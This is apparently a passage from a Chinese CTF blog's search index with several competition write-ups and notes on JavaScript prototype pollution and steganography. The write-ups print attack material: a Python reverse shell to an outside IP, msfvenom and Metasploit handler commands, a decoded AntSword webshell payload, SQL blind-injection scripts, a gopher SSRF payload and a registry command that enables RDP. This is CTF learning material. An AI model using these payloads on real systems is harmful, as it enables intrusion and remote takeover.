&quot;age&quot;:11, &quot;gender&quot;: &quot;M&quot;} #typeof object null 发送null#typeof object 加运算字符串+字符串依然得到字符串字符串+数组也是，其他都是但如果不是字符串相加，则为true+true=2#因为true为1基本上除了Number+Number=Number，Bool+Bool=Number js各种小trick一个正数的负大数次方为0，负数的则为-0NaN和NaN不相等e++&lt;e--肯定满足；做比较时true为1,false为0任何非空字符串都为真,js中两个等号为弱类型判断string(大数)返回Infinity;json.parse()可以处理数字in对数组来说是判断数组的key括号json.parse()基本一样效果;json.parse()可以解析__proto__对null变量进行数组寻址会报错，并且null变量为object javascript原型链污染三种属性1.__proto__和constructor属性是对象所独有的:2.prototype属性是函数所独有 但是由于JS中函数也是一种对象，所以函数也拥有__proto__和constructor属性 __proto__proto属性是对象所独有的 作用：当访问一个对象的属性时，如果该对象内部不存在这个属性，那么他就会去它的proto属性所指向的那个对象（理解为父对象），如果父对象也没有，则在往上找，如果一直到原型链顶端都没有该属性，就会报错 这种通过__proto__属性来连接对象直到null的一条链即为我们所谓的原型链。其实我们平时调用的字符串方法、数组方法、对象方法、函数方法等都是靠__proto__继承而来的。 prototype属性它是函数所独有的，是从函数指向对象，并且是函数的原型对象，也就是这个函数（其实所有函数都可以作为构造函数）所创建的实例的原型对象，由此可知 f1.__proto__==Foo.prototype **作用:**包含可以由特定类型的所有实例所共享的属性和方法，也就是让该函数所实例化的对象们都可以找到公用的属性和方法，任何函数在创建的时候，其实会默认同时创建该函数的prototype对象 constructor属性它是对象才拥有的，他是从一个对象指向一个函数，含义就是指向该对象的构造函数，每个对象都有构造函数 原型链eg: var a = {};console.log(a.__proto__); //Object {}console.log(a.__proto__ === a.constructor.prototype); //true 小结1.我们需要牢记两点：①__proto__和constructor属性是对象所独有的；②prototype属性是函数所独有的，因为函数也是一种对象，所以函数也拥有__proto__和constructor属性。 2.__proto__属性的作用就是当访问一个对象的属性时，如果该对象内部不存在这个属性，那么就会去它的__proto__属性所指向的那个对象（父对象）里找，一直找，直到__proto__属性的终点null，再往上找就相当于在null上取值，会报错。通过__proto__属性将对象连接起来的这条链路即我们所谓的原型链。 3.prototype属性的作用就是让该函数所实例化的对象们都可以找到公用的属性和方法，即f1.proto === Foo.prototype。(意思是让f1可以找到公用的属性方法，即向上找有prototype给他) 4.constructor属性的含义就是指向该对象的构造函数，所有函数（此时看成对象了）最终的构造函数都指向Function。 javascript基础语法传输数据1.req.params/req.query/req.bodyreq.params eg:/modify/:file/modify/index那么req.params.file=index req.query eg:?id=2那么req.query.id那么就可以得到2 req.body(针对post请求) eg:post:username=adbcreq.body.username=adbc 定义变量const: 用于定义不可变变量**var 声明语句声明一个变量，并可选地将其初始化为一个值**process.env:返回包含用户环境的对象","link":"/2021/10/02/javascript%E5%A5%87%E5%A6%99%E7%9A%84%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"},{"title":"2021绿城杯","text":"前言这次比赛，难得很难，简单的很简单，然后由于那天要上课，题目没做啥，后面下课一直在看cms，导致looking for treasure没去找，以为也是js的难题，后来看到很多人解出来，就去找，可是时间已经来不及了=-=，不过今天主要是学习一下这个流量分析，感觉挺有意思的 ezphp签到题，很简单，就是assert()函数，然后跟前两buu刚做的那题考点差不多，闭合前面的内容，然后重新进行命令执行 '.system(&quot;cd /var/www/html/;git status;&quot;).'about looking for treasuredefcon的原题 https://blog.zeddyu.info/2020/10/15/Defcon28final/ 题解分析第一个漏洞点是这里,直接利用包含，包含的时候如果报错，会直接将报错内容报出 let json_library = require(req.params.library) 这里存在一个js的原型链污染直接搜defcon nooode即可 流量取证题目放出hint，说是蚁剑，于是查询了一下 发现往这边post了很多数据，但是经过混淆，发现了secret.zip找到压缩包，然后将其导出用010editer打开， 发现需要密码 那么密码肯定就在被混淆的那些数据当中了，所以需要知道如何解密，使用python写一下脚本 import base64import zlibdef decode_config_cmd(basestr): return zlib.decompress(base64.b64decode(basestr),-zlib.MAX_WBITS)print(decode_config_cmd('c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD/APDomON6hIMzA1TzWwMExJs7CwiNXU1LQGAA==')) 解压结果： b'@eval(@gzinflate(base64_decode($_POST[_0xf057e081df888])));' 但是往下继续解密，没发现其他有用的数据，再继续往下看看数据包的时候，就发现，有个对secret.zip进行压缩的操作 针对这个数据，进行解密看看 @ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir = @ini_get(&quot;open_basedir&quot;);if ($opdir) { $ocwd = dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); $oparr = preg_split(&quot;/;|:/&quot;, $opdir); @array_push($oparr, $ocwd, sys_get_temp_dir()); foreach ($oparr as $item) { if (!@is_writable($item)) { continue; } $tmdir = $item . &quot;/.fedd1&quot;; @mkdir($tmdir); if (!@file_exists($tmdir)) { continue; } @chdir($tmdir); @ini_set(&quot;open_basedir&quot;, &quot;..&quot;); $cntarr = @preg_split(&quot;/\\\\\\\\|\\\\//&quot;, $tmdir); for ($i = 0; $i &lt; sizeof($cntarr); $i++) { @chdir(&quot;..&quot;); } @ini_set(&quot;open_basedir&quot;, &quot;/&quot;); @rmdir($tmdir); break; }}function asenc($out){ return $out;}function asoutput(){ $output = ob_get_contents(); ob_end_clean(); echo &quot;36&quot; . &quot;4f2&quot;; echo @asenc($output); echo &quot;42&quot; . &quot;ff1&quot;;}ob_start();try { $p = base64_decode(substr($_POST[&quot;f861d394170244&quot;], 2)); $s = base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;], 2)); $envstr = @base64_decode(substr($_POST[&quot;b430b310838a93&quot;], 2)); $d = dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); $c = substr($d, 0, 1) == &quot;/&quot; ? &quot;-c \\&quot;{$s}\\&quot;&quot; : &quot;/c \\&quot;{$s}\\&quot;&quot;; if (substr($d, 0, 1) == &quot;/&quot;) { @putenv(&quot;PATH=&quot; . getenv(&quot;PATH&quot;) . &quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;); } else { @putenv(&quot;PATH=&quot; . getenv(&quot;PATH&quot;) . &quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;); } if (!empty($envstr)) { $envarr = explode(&quot;|||asline|||&quot;, $envstr); foreach ($envarr as $v) { if (!empty($v)) { @putenv(str_replace(&quot;|||askey|||&quot;, &quot;=&quot;, $v)); } } } $r = &quot;{$p} {$c}&quot;; function fe($f) { $d = explode(&quot;,&quot;, @ini_get(&quot;disable_functions&quot;)); if (empty($d)) { $d = array(); } else { $d = array_map('trim', array_map('strtolower', $d)); } return function_exists($f) &amp;&amp; is_callable($f) &amp;&amp; !in_array($f, $d); } function runshellshock($d, $c) { if (substr($d, 0, 1) == &quot;/&quot; &amp;&amp; fe('putenv') &amp;&amp; (fe('error_log') || fe('mail'))) { if (strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) { $tmp = tempnam(sys_get_temp_dir(), 'as'); putenv(&quot;PHP_LOL=() { x; }; {$c} &gt;{$tmp} 2&gt;&amp;1&quot;); if (fe('error_log')) { error_log(&quot;a&quot;, 1); } else { mail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;); } } else { return False; } $output = @file_get_contents($tmp); @unlink($tmp); if ($output != &quot;&quot;) { print $output; return True; } } return False; } function runcmd($c) { $ret = 0; $d = dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]); if (fe('system')) { @system($c, $ret); } elseif (fe('passthru')) { @passthru($c, $ret); } elseif (fe('shell_exec')) { print @shell_exec($c); } elseif (fe('exec')) { @exec($c, $o, $ret); print join(&quot;\\r\\n&quot;, $o); } elseif (fe('popen')) { $fp = @popen($c, 'r'); while (!@feof($fp)) { print @fgets($fp, 2048); } @pclose($fp); } elseif (fe('proc_open')) { $p = @proc_open($c, array(1 =&gt; array('pipe', 'w'), 2 =&gt; array('pipe', 'w')), $io); while (!@feof($io[1])) { print @fgets($io[1], 2048); } while (!@feof($io[2])) { print @fgets($io[2], 2048); } @fclose($io[1]); @fclose($io[2]); @proc_close($p); } elseif (fe('antsystem')) { @antsystem($c); } elseif (runshellshock($d, $c)) { return $ret; } elseif (substr($d, 0, 1) != &quot;/&quot; &amp;&amp; @class_exists(&quot;COM&quot;)) { $w = new COM('WScript.shell'); $e = $w-&gt;exec($c); $so = $e-&gt;StdOut(); $ret .= $so-&gt;ReadAll(); $se = $e-&gt;StdErr(); $ret .= $se-&gt;ReadAll(); print $ret; } else { $ret = 127; } return $ret; } $ret = @runcmd($r . &quot; 2&gt;&amp;1&quot;); print $ret != 0 ? &quot;ret={$ret}&quot; : &quot;&quot;;} catch (Exception $e) { echo &quot;ERROR://&quot; . $e-&gt;getMessage();}asoutput();die; 关键代码就这几行 $p = base64_decode(substr($_POST[&quot;f861d394170244&quot;], 2)); $s = base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;], 2)); $envstr = @base64_decode(substr($_POST[&quot;b430b310838a93&quot;], 2)); 对post的数据从第二位以后开始截取，然后进行base64解密得到，那么-后面的应该就是密码了 b'cmd'b'cd /d &quot;D:\\\\\\\\phpstudy_pro\\\\\\\\WWW\\\\\\\\secret&quot;&amp;&quot;C:\\\\Program Files\\\\7-Zip\\\\7z.exe&quot; x secret.zip -pP4Uk6qkh6Gvqwg3y&amp;echo 378df2c234&amp;cd&amp;echo fb7f8f' 做到这里，我以为已经快结束了，没想到还有–，虽然说这个文件可以用了，但是他就只是一个cs的beacon模式密钥，所以还需要从下面的beacon的流量中做一下文章:https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng大概说一下，使用beacon模式传输数据，会对数据进行加密，并且是RSA非对称加密，并且公钥和私钥都会存储在这个key当中，所以先针对key进行公钥和私钥的解出，然后再去解密其他beacon流量，应该就可以找到flag使用了一下网上的项目，但是java程序一直跑不起来，等解决了再来补充这一部分的操作，拿到加密的私钥以后 MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAIqpewO+lqNYuxQhQwq7pMdM7CP92uer5FkUA41vPaelrbpqr1ujH95Q7Rfqt7E7Vc+Xx5dYQCoRaysjNm+UfuRcFocLHG2ugf4+/NEX/NFE+gI279wXfC+zZ0MGFMQIAC1TClaiMvALwMB9nBuXK/CErC754co9cIbaIkCl/sRXAgMBAAECgYBqlSFYXHwfrMmIDJUiv99FzovIko1b/FV2Xxrn8TS8E265Vt3Zm0aYtS25b5Ko6YnpGqqxW4VekKsGqndiRwtNSbIilU1EqWqfdBmucptnISgDdx+ofWbInTRl+leBzDW4Zsl2sMvMmmyhsc/X35pGbH2lRXXEegPzradtyBwhUQJBANt2IC4p5CQW2UxXVjmrTbA+CuJLfnZE+97HCjzZPi/gUiF4akFQx46x0vT1RmcalqUg1Prl7OoKb05Lmwm0XukCQQChv4blpfqVcdz9X6MGJqeaiC22EPZn+2dhm4PbZIhurs57M7+dqlYxoG6LneU0H1N8ieeH9fb9ixG/8+F7iIE/AkEAzyzYfDv3r0oSoMriD1bz5CjtxWtXWvcMfuaPd5nt5uxxHD+8ryQ+/ypH6A+UAslK5V/1L1XXLankIZmmJqcr4QJAGUAkF//EUcY3wJpIgfJQ4e/2auDVBsCZkAROHlbgcZ76fwNCG6P21sJ733Hj0TI+v0dsDK6aQ1SNjdDN15Ik0wJBAK7C5l0QF8NRlIw2+tPUSDVy/PRUVmpRRd4cD4HXNtVMg0Dr3L7vx9PeyJH0EFuaVWItdBDILP0HzUR1/wk5ZFY= 贴一下大佬的脚本 import hashlibfrom Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5import base64import hexdump PRIVATE_KEY = &quot;&quot;&quot;-----BEGIN RSA PRIVATE KEY-----{}-----END RSA PRIVATE KEY-----&quot;&quot;&quot; encode_data = &quot;bGOniQ5nfrSmAW9fgdZSCC+42t5xvQt+B4SVEu6Q8MvC4rPn/OThepmxP6GjDiP1wCUB1EE3sqeXkwdHHMd9wikZhiQnjT9AB3e2RNacCVF+8v/nj/Rv85fSD2Phfc/wsaAjld9Fy8ZJJKz1wPwPY6lTxArMGFtX7W+VW/gzujI=&quot;base64_key = &quot;&quot;&quot;MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAIqpewO+lqNYuxQhQwq7pMdM7CP92uer5FkUA41vPaelrbpqr1ujH95Q7Rfqt7E7Vc+Xx5dYQCoRaysjNm+UfuRcFocLHG2ugf4+/NEX/NFE+gI279wXfC+zZ0MGFMQIAC1TClaiMvALwMB9nBuXK/CErC754co9cIbaIkCl/sRXAgMBAAECgYBqlSFYXHwfrMmIDJUiv99FzovIko1b/FV2Xxrn8TS8E265Vt3Zm0aYtS25b5Ko6YnpGqqxW4VekKsGqndiRwtNSbIilU1EqWqfdBmucptnISgDdx+ofWbInTRl+leBzDW4Zsl2sMvMmmyhsc/X35pGbH2lRXXEegPzradtyBwhUQJBANt2IC4p5CQW2UxXVjmrTbA+CuJLfnZE+97HCjzZPi/gUiF4akFQx46x0vT1RmcalqUg1Prl7OoKb05Lmwm0XukCQQChv4blpfqVcdz9X6MGJqeaiC22EPZn+2dhm4PbZIhurs57M7+dqlYxoG6LneU0H1N8ieeH9fb9ixG/8+F7iIE/AkEAzyzYfDv3r0oSoMriD1bz5CjtxWtXWvcMfuaPd5nt5uxxHD+8ryQ+/ypH6A+UAslK5V/1L1XXLankIZmmJqcr4QJAGUAkF//EUcY3wJpIgfJQ4e/2auDVBsCZkAROHlbgcZ76fwNCG6P21sJ733Hj0TI+v0dsDK6aQ1SNjdDN15Ik0wJBAK7C5l0QF8NRlIw2+tPUSDVy/PRUVmpRRd4cD4HXNtVMg0Dr3L7vx9PeyJH0EFuaVWItdBDILP0HzUR1/wk5ZFY=&quot;&quot;&quot; private_key = RSA.import_key(PRIVATE_KEY.format(base64_key).encode())cipher = PKCS1_v1_5.new(private_key)ciphertext = cipher.decrypt(base64.b64decode(encode_data), 0) 得到 AES key:7c83bf30a6ad2dc410040d33e1399cf6HMAC key:a77945b3a56687a39f90683cb24d00c2 然后利用这两个aes密钥对返回的内容进行解密发现读取了flag.txt，于是再去寻找一下返回流量 在下条流量中就发现了返回的数据，提取其base64形式，再对其进行解码操作 即可拿到flag 看了一下大佬的题解，发现自己昨天就是困在套娃代码不知道如何解开的步骤","link":"/2021/09/30/%E7%BB%BF%E5%9F%8E%E6%9D%AF/"},{"title":"2021国赛总决赛复现","text":"babypython[国赛总决赛复现]","link":"/2021/10/09/2021%E5%9B%BD%E8%B5%9B%E6%80%BB%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/"},{"title":"TSG2021+0ctf","text":"前言战队让加的比赛讨论群一个没少加，题目也是一个都不会，就把一些感觉现阶段可以学懂的题目复现一下试试看 Welcome to TSG CTF!签到题，签了很多人 const {promises: fs} = require('fs');const fastify = require('fastify');const flag = process.env.FLAG || 'DUMMY{DUMMY}';const app = fastify();app.get('/', async (_, res) =&gt; { res.type('text/html').send(await fs.readFile('index.html'));});app.post('/', (req, res) =&gt; { if (typeof req.body === 'object' &amp;&amp; req.body[flag] === true) { return res.send(`Nice! flag is ${flag}`); } return res.send(`You failed...`);});app.listen(34705, '0.0.0.0'); 关键的代码在 typeof req.body === 'object' &amp;&amp; req.body[flag] === true 意思是说，post传入的数据的typeof为object，并且这个数据的[flag]要为true，这里就需要理解一下什么是[flag]，比如说flag是abc那么他就是[abc]，比如说我传入一个tlif3，那么我就要有一个tlif3[abc]=true，很显然，这是不可能达成的，因为我们根本不知道flag的值为多少，那么这里就有一个小trick首先typeof 为object的有数组对象，还有一个null，而如果针对null进行寻址的话，就会报错，此时报错就会将flag的值给带出 Win-Win刚刚去看了一下，发现没环境了—于是就把题解说的看一下吧 windows找后台目录Windows 在搜索文件的时候使用到了FindFirstFile 这一个winapi 函数，该函数到一个文件夹(包括子文件夹) 去搜索指定文件。利用方法: 我们只要将文件名不可知部分之后的字符用“&lt;”或者“&gt;”代替即可，不过要注意的一点是，只使用一个“&lt;”或者“&gt;”则只能代表一个字符，如果文件名是12345或者更长，这时候请求“1&lt;”或者“1&gt;”都是访问不到文件的，需要“1&lt;&lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。 可以发现在windows系统下是可以这样进行读取文件的操作，那么这就意味着，我们只需要对首字母进行爆破即可参考:https://blog.csdn.net/bylfsj/article/details/102771173 然后寻找配置文件之类的进行读取，最后再包含xampp的 apache_start.bat文件成功：?win=..\\..\\t&lt;\\apache_start.bat。 读取php.ini文件：?win=..\\..\\t&lt;\\php\\phpi.ini，发现了路径：C:\\THIS_IS_A_SECRET_PATH_107B1177348CC063A0713838282B1C27892D5FE2\\ 然后session文件上传，但是题目本来说不可以的，所以应该就是非预期解了然后本地生成msf马 msfvenom -p windows/meterpreter/reverse_tcp lhost=xx.xx.xx.xx lport=5555 -f exe -o shell.exe 并在服务器进行监听 Use exploit/multi/handlerSet payload windows/meterpreter/reverse_tcpSet lhost 0.0.0.0Set lport 5555Run 使用getsystem进行提权登录界面，因为要截图 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f screenshot没有权限。打开3389端口，修改administrator密码： 即可在桌面上看到flag RevengePHP","link":"/2021/10/05/TSG2021/"},{"title":"2021鹤城杯","text":"前言今天满课了，抽时间打了一下鹤城杯，web做了两题，第三题感觉可以做的，因为在去上课的路上查到了bypass的手法，不过后面学长也做出来了，tql，然后做了两题流量取证的misc，还不错，这里就就贴一下自己做出来的几题，顺便记录一下其他没做出来的题 middle_magic考烂的php黑魔法 流量取证盲注找flag flag{w1reshARK_ez_1sntit} easy_sql_2拿了一个十血，但是感觉可以更快的，可惜早上有课 过滤了select，联想到堆叠或者mysql8.0的table测试了一下发现是mysql8.0，故用table进行注入 def sql_injection(pay_lo):#库名和版本 fina_wod=&quot;&quot; for i in range(1,100): low=32 high=128 mid=(low+high)//2 while(low&lt;high): payload_1=f&quot;admin'and ascii(substr(({payload}),{i},1))&gt;{mid}#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) data={ 'username':payload_1, 'password':&quot;1&quot; } #print(data) r=s.post(url=url,data=data).text print(r) if &quot;password error!&quot; in r: low = mid + 1 else: high = mid mid = (low + high) // 2 if (mid == 32 or mid == 128): break fina_wod += chr(mid) print(fina_wod)def sql_injection_s():#表名 fina_wod=&quot;&quot; a=&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot; for i in range(0,100): for j in range(0,62): #payload_2=f&quot;admin'and (('def','ctf','{fina_wod+a[j]}','',1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)&lt;(table information_schema.tables order by TABLE_SCHEMA limit 1,1))#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) payload_2=f&quot;admin'and ('ctf','{fina_wod+a[j]}',1,1,1,1)&lt;(table mysql.innodb_table_stats order by database_name limit 1,1)#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) data={ 'username':payload_2, 'password':&quot;1&quot; } r = s.post(url=url, data=data).text print(payload_2) print(r) if &quot;username error&quot; in r: fina_wod+=a[j-1] print(fina_wod) breakdef search_co():#探测表在第几个 for i in range(0,10000): #payload=f&quot;admin'and/**/('def','ct',1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)&lt;(table information_schema.tables order by table_schema desc limit {i},1)#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) payload=f&quot;admin'and/**/('ct',1,1,1,1,1)&lt;(table mysql.innodb_table_stats order by database_name limit {i},1)#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) data1={ 'username':payload, 'password':&quot;123&quot; } #print(data1) #print(s.post(url=url,data=data1).text) if &quot;username error!&quot; in s.post(url=url,data=data1).text: print(&quot;ctf库在第&quot;,i,&quot;列&quot;)if __name__==&quot;__main__&quot;: #payload=&quot;database()&quot;#ctf #payload=&quot;version()&quot;#8.0.26-0ubuntu0.20.04.2 payload=&quot;table fl11aag limit 1,1&quot; #search_co() #print_word() sql_injection(payload) #sql_injection_s() misc 依旧是盲注找flag，没啥好说的，不过前面的好像是图片隐写啥的，没做出来，xy大佬发给我的这个流量取证的 99,100,50,99,51,101,50,102,101,97,52,54,51,100,101,100,57,97,102,56,48,48,100,55,49,53,53,98,101,55,97,113,125 easyp同样是黑魔法 &lt;?phpinclude 'flag.php';if (isset($_POST['guess'])) { $guess = (string) $_POST['guess']; if ($guess === $secret) { $message = 'Congratulations! The flag is: ' . $flag; } else { $message = 'Wrong. Try Again'; }}if (preg_match('/utils\\.php\\/*$/i', $_SERVER['PHP_SELF'])) { exit(&quot;hacker :)&quot;);}if (preg_match('/show_source/', $_SERVER['REQUEST_URI'])){ exit(&quot;hacker :)&quot;);}if (isset($_GET['show_source'])) { highlight_file(basename($_SERVER['PHP_SELF'])); exit();}else{ show_source(__FILE__);} 第一个用%0a或者%0d绕过，一开始我用%0a可以，后来用%0d才可以，都放在utils.php的后面然后第二个使用url的一个检测机制绕过访问这个是学长的截图了，放在这里记录一下 spring这题也是学长做的，不过说是原题 Spring Web Flow框架远程代码执行(CVE-2017-4971) https://juejin.cn/post/7006672559714336805 easy_sql_1唯一没做出来的一题一开始以为是ssrf打mysql，后来发现怎么打都不行，然后赛后问其他师傅，说是要打index.php那个页面，贴一下flag a = &quot;admin')and (extractvalue(1,concat(0x7e,(select group_concat(flag) from flag),0x7e)))#&quot;a = quote(base64.b64encode(a.encode(&quot;utf-8&quot;)))payload = f'''gopher%3a%2f%2f127.0.0.1%3a80%2f_post%20%2findex.php%20http%2f1.1%250d%250ahost%3a%20localhost%3a80%250d%250acookie%3a%20phpsessid%3d25c1mm4b3ppn9ohr2gve7d4tg4%3bthis_is_your_cookie%3d{a}%250d%250aconnection%3a%20close%250d%250acontent-type%3a%20application%2fx-www-form-urlencoded%250d%250acontent-length%3a%2021%250d%250a%250d%250auname%3dadmin%26passwd%3dadmin''' 解码以后是就是使用gopher发送post请求到本地的index.php页面，然后使用admin/admin进行登录，并且注入点是在cookie的位置的 a = &quot;admin')and (extractvalue(1,concat(0x7e,(select group_concat(flag) from flag),0x7e)))#&quot;a = quote(base64.b64encode(a.encode(&quot;utf-8&quot;)))payload = f'''gopher://127.0.0.1:80/_post /index.php http/1.1host: localhost:80cookie: phpsessid=25c1mm4b3ppn9ohr2gve7d4tg4;this_is_your_cookie={a}connection: closecontent-type: application/x-www-form-urlencodedcontent-length: 21uname=admin&amp;passwd=admin'''","link":"/2021/10/08/2021%E9%B9%A4%E5%9F%8E%E6%9D%AF/"},{"title":"V&amp;N2020","text":"HappyCTFdctfd漏洞 cve-2020-7245 CheckIn考点： 1.无回显rce 2.文件描述符分析源码: from flask import Flask, requestimport osapp = Flask(__name__)flag_file = open(&quot;flag.txt&quot;, &quot;r&quot;)# flag = flag_file.read()# flag_file.close()## @app.route('/flag')# def flag():# return flag## want flag? naive!# You will never find the thing you want:) I think@app.route('/shell')def shell(): os.system(&quot;rm -f flag.txt&quot;) exec_cmd = request.args.get('c') os.system(exec_cmd) return &quot;1&quot;@app.route('/')def source(): return open(&quot;app.py&quot;,&quot;r&quot;).read()if __name__ == &quot;__main__&quot;: app.run(host='0.0.0.0') 我们先分析下几个路由，很明显，我们可以在shell这个路由执行命令，但是他是无回显的，然后接下来我们可以看到，flag.txt这个文件，会先被打开，然后再执行删除命令，所以要如何读到这个flag呢？文件描述符什么是文件描述符：内核利用文件描述符来访问文件。文件描述符是非负整数。打开现存文件或新建文件时，内核会返回一个文件描述符。读写文件也需要使用文件描述符来指定待读写的文件。 例如Python中，当我们open()函数打开一个文件时便创建了一个文件描述符，而后对这个文件描述符使用read()函数便是读取文件描述符中的内容，close()函数用于关闭/销毁这个文件描述符。 文件描述符储存在什么地方：/proc/&lt;pid&gt;/fd&lt;id&gt; 也就是说，我们可以通过cat进程中的fd来获取到文件描述符。而文件描述符中就存储着该文件的内容 无回显命令执行，一般都是考虑反弹shell操作，但是这里curl等一些常见命令都执行不了，这有这个可以 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;110.42.133.120&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);' 接下来就使用以下命令 cd /proclscd /proc/[pid]#进程数字cd /porc/[pid]/fdcat [文件描述符数字] 进行flag的查找即可 小结这题的考点让我没想到的是，原来文件描述符里面可以存储文件的信息，只要你有对他进行操作既有，以前都是光用，没想到这个~，现在就明了了 TimeTravel&lt;?phperror_reporting(0);require __DIR__ . '/vendor/autoload.php';use GuzzleHttp\\Client;highlight_file(__FILE__);if(isset($_GET['flag'])) { $client = new Client(); $response = $client-&gt;get('http://127.0.0.1:5000/api/eligible'); $content = $response-&gt;getBody(); $data = json_decode($content, TRUE); if($data['success'] === true) { echo system('/readflag'); }}if(isset($_GET['file'])) { highlight_file($_GET['file']);}if(isset($_GET['phpinfo'])) { phpinfo();} 拿到flag的条件是data[success]的条件为true，这里有个漏洞就是这题的考点https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy大致就是，如果定义了环境变量http_proxy，php内的http-api就会走这个代理。在这个phpinfo中就开启了cgi模式了，然后可以在服务器写入需要传入的一个true的内容，并在题目那边配置这个地址即可收到我们传入的content HTTP/1.1 200 OKServer: nginx/1.14.2Date: Fri, 06 Mar 2020 18:27:31 GMTContent-Type: text/html; charset=UTF-8Connection: Keep-aliveContent-Length: 16{&quot;success&quot;:true}","link":"/2021/10/09/V-N2020/"},{"title":"misc入门","text":"图片文件头修复常见的图片格式文件头如下： 文件类型 文件头 JPEG(jpg) FFD8FF PNG(png) 89504E47 GIF(gif) 47494638 BMP 424DC001 其他更多类型的文件头请看https://blog.csdn.net/qq_23100787/article/details/79040925 方法：以16进制的方式打开文件，在文件最开始添加相应的文件头 CRC校验修复 3.宽高修复对于png格式的图片，宽高的数据位置如图片所展示的那样 如果遇到简单一点的题目，可以直接尝试修改宽高，这里建议一般选择修改高度，一点点的改动即可。如果随意修改宽度一般都是会造成图像错误的。 一个简单的检测宽高是否有误的方法：在Windows下能打开的图片在linux下不能打开，就说明可能是宽高存在问题 最正确的方法则是通过crc值爆破宽高，给出大佬的脚本（记不得是哪里找到的了） #!/usr/bin/env python#-*- coding:UTF-8 -*-import binasciiimport structimport oscrcbp = open(&quot;flag.png&quot;,&quot;rb&quot;).read()#填文件名for i in range(1024): for j in range(1024): data = crcbp[12:16] + struct.pack('&gt;i',i) + struct.pack('&gt;i',j) + crcbp[24:29] crc32 = binascii.crc32(data) &amp; 0xffffffff if crc32 == 0x4d614986 :#此处填CRC值 print (i); print (j); print (hex(i),hex(j)) 爆破出来后修改即可。 对于jpg格式的图片也存在宽高隐写，有师傅写的很详细了，此处不再赘述。有需要的朋友请移步：https://blog.csdn.net/u010391191/article/details/80811813 4.LSB隐写有关该隐写方式的原理网上已经有很多文章写过了，此处简单说一下做题方法。 工具：stegsolve（需要java环境） 用该工具打开图片后，点击然后按照如下图片点击最后点击preview。有时候点preview没用，需要点击最下面的save text或者save bin才能得出结果。这张图只是给出了示例，具体做题的时候可以多试一下和其他按键的组合。 还有一个比较简单的方法，用zsteg工具，需要kali里面在线安装：gem install zsteg 使用命令格式：zsteg filename 5.对于两张相同图片的隐写1.盲水印 两张相同的图片首先考虑盲水印。使用方法及脚本移步https://github.com/chishaxie/BlindWaterMark 2.组合进行不同运算（and、or、xor等） 还是用stegsolve，点击之后会再让你打开一张图片，此时需要注意两张图片的打开顺序不同，运算的结果也不同，实际操作中就需要各位来回试一下了 6.文件分离常用工具：binwalk、formost、dd binwalk：可快速分辨文件是否由多个文件合并而成，并将文件进行分离。如果分离成功会在目标文件的目录。 分析文件：binwalk filename 分离文件：binwalk -e filename formost命令：formost filename -o 输出的目录名 因本人较懒，所以用了一个师傅说的方法，在用formost分离文件时很方便（不用敲命令）。参考链接：https://blog.csdn.net/qq_39368007/article/details/91129628 dd：当文件自动分离出错或者因为其他原因无法自动分离时使用 ps：如果一个工具分离不出来一定要多试几种，因为每种工具分离方法都有所差别，难免会出现分离不出来的情况。 7.二维码取反色 有一道题就是将二维码颜色取反再扫描得出结果，记不得是哪里的了。具体操作可以用windows自带的画图工具，打开图片然后点击主页的选择选中图片后右键选择反色当你发现二维码的三个定位点是白色的时候，就说明需要进行反色操作了 8.一些其他常用工具介绍针对jpg格式图片的隐写： steghide 用法： 隐藏文件steghide embed -cf [图片或wav文件载体] -ef [待隐藏文件]steghide embed -cf 1.jpg -ef 1.txt 查看图片中嵌入的文件信息steghide info 1.jpg 提取图片中隐藏的文件steghide extract -sf 1.jpg stegdetect（可检测通过JSteg,JPHide,OutGuess,Invisible,F5,oppendX,Camouflage等隐写工具隐藏的信息） 用法： stegdetect xxx.jpg stegdetect -s 敏感度 xxx.jpgexi stegbreak（爆破密码）stegbreak.exe -r rules.ini -f password.txt p -c hide.jpg jphide silenteye（下面会有一定的介绍，用法基本一致） 音频隐写1.针对mp3文件的隐写将分别介绍以下工具：Audacity、MP3Stego Audacity 一般得到题目文件，打开听到有杂音首选用这个工具打开。简单的题目就是在原音频中加入了一段摩斯密码，通过这个工具可以直接看出来 然后解密即可。 